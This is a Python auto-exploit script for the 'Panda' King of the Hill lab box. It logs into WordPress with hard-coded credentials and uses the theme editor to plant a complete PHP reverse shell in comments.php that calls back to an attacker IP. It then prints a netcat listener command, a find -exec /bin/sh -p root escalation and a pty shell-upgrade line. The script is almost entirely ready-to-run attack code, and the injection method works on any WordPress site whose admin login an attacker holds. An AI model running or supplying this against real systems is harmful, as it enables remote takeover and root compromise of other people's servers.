#!/usr/bin/env python3
import requests
import sys
from bs4 import BeautifulSoup
import time 

# Terminal colors
RED     = "\033[91m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
BLUE    = "\033[94m"
MAGENTA = "\033[95m"
CYAN    = "\033[96m"
RESET   = "\033[0m"

def print_banner():
    banner = CYAN + """
[+]==============================[+]
|    PANDA - KING OF THE HILL    |
|    Auto Exploit Script - KOTH  |
|    Made by: Muhamad Rohan Khan |
[+]==============================[+]

Difficulty: — EASY
Follow me on linkedin:- https://www.linkedin.com/in/muhammadrohankhan
""" + RESET
    print(banner)

print(YELLOW + "[+] Make sure you have added 'panda.thm' to your /etc/hosts file, pointing to the target IP." + RESET)
print(YELLOW + "[*] Script starting in 3 seconds..." + RESET)
time.sleep(3)

def get_reverse_shell_code(ip, port):
    return f"""<?php
// PHP Reverse Shell
set_time_limit (0);
$VERSION = "1.0";
$ip = '{ip}';
$port = {port};
$chunk_size = 1400;
$shell = 'uname -a; w; id; /bin/sh -i';

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) exit(1);

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) exit(1);

while (1) {{
    if (feof($sock) || feof($pipes[1])) break;
    
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    
    if (in_array($sock, $read_a)) {{
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }}
    
    if (in_array($pipes[1], $read_a)) {{
        $input = fread($pipes[1], $chunk_size);
        fwrite($sock, $input);
    }}
}}

// Clean up
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
?>"""

def exploit_wordpress(username, password, attacker_ip, attacker_port):
    try:
        target_url = "http://panda.thm/wordpress"
        session = requests.Session()
        
        # Step 1: Login to WordPress
        login_url = f"{target_url}/wp-login.php"
        admin_url = f"{target_url}/wp-admin/"
        
        print(YELLOW + f"[*] Attempting to login to {login_url}" + RESET)
        session.get(login_url)
        session.cookies.set('wordpress_test_cookie', 'WP+Cookie+check')
        
        login_data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': admin_url,
            'testcookie': '1'
        }
        
        login_response = session.post(login_url, data=login_data)
        
        if "Dashboard" not in login_response.text:
            print(RED + "[-] Login failed. Check credentials or login URL." + RESET)
            return False
        
        print(GREEN + "[+] Login successful!" + RESET)
        
        # Step 2: Get theme editor nonce
        theme_editor_url = f"{admin_url}theme-editor.php?file=comments.php&theme=twentyseventeen"
        print(YELLOW + f"[*] Accessing theme editor at {theme_editor_url}" + RESET)
        theme_editor_response = session.get(theme_editor_url)
        
        soup = BeautifulSoup(theme_editor_response.text, 'html.parser')
        nonce = soup.find('input', {'name': '_wpnonce'})['value']
        if not nonce:
            print(RED + "[-] Could not find _wpnonce token" + RESET)
            return False
        
        print(GREEN + f"[+] Found _wpnonce: {nonce}" + RESET)
        
        # Step 3: Inject reverse shell
        reverse_shell = get_reverse_shell_code(attacker_ip, attacker_port)
        update_data = {
            '_wpnonce': nonce,
            '_wp_http_referer': theme_editor_url,
            'newcontent': reverse_shell,
            'action': 'update',
            'file': 'comments.php',
            'theme': 'twentyseventeen',
            'scrollto': '102',
            'submit': 'Update File'
        }
        
        print(YELLOW + "[*] Attempting to inject reverse shell into comments.php" + RESET)
        update_response = session.post(f"{admin_url}theme-editor.php", data=update_data)
        
        if "File edited successfully" in update_response.text:
            print(GREEN + "[+] Reverse shell injected successfully!" + RESET)
            trigger_url = f"{target_url}/index.php/2020/04/11/hello-world/#comment-1"
            print(CYAN + f"[*] Trigger the shell by visiting: {trigger_url}" + RESET)
            print(CYAN + "[*] Make sure you have a listener running:" + RESET)
            print(GREEN + f"    nc -lvnp {attacker_port}" + RESET)
            return True
        else:
            print(RED + "[-] Failed to inject reverse shell" + RESET)
            return False
            
    except Exception as e:
        print(RED + f"[-] Error: {str(e)}" + RESET)
        return False

if __name__ == "__main__":
    print_banner()
    
    # Default credentials
    default_username = "po"
    default_password = "password1"
    
    if len(sys.argv) == 3:
        username = sys.argv[1]
        password = sys.argv[2]
    elif len(sys.argv) == 1:
        username = default_username
        password = default_password
        print(YELLOW + f"[*] Using default credentials: {username}/{password}" + RESET)
    else:
        print(RED + "Usage: python3 panda_exploit.py [username] [password]" + RESET)
        print(YELLOW + "Example with defaults: python3 panda_exploit.py" + RESET)
        print(YELLOW + "Example with custom: python3 panda_exploit.py admin password123" + RESET)
        sys.exit(1)
    
    attacker_ip = input(CYAN + "Enter your attacker IP: " + RESET).strip()
    attacker_port = input(CYAN + "Enter listener port [4444]: " + RESET).strip() or "4444"
    
    print(YELLOW + "\n[*] Starting exploitation..." + RESET)
    if exploit_wordpress(username, password, attacker_ip, attacker_port):
        print(GREEN + '[+] Use this command to get root access "find . -exec /bin/sh -p \\; -quit"' + RESET)
        print(GREEN + '[+] For interactive shell use this " python -c 'import pty; pty.spawn("/bin/bash")' "' + RESET)
        print(GREEN + "[+] Exploitation completed successfully!" + RESET)
    else:
        print(RED + "[-] Exploitation failed" + RESET)
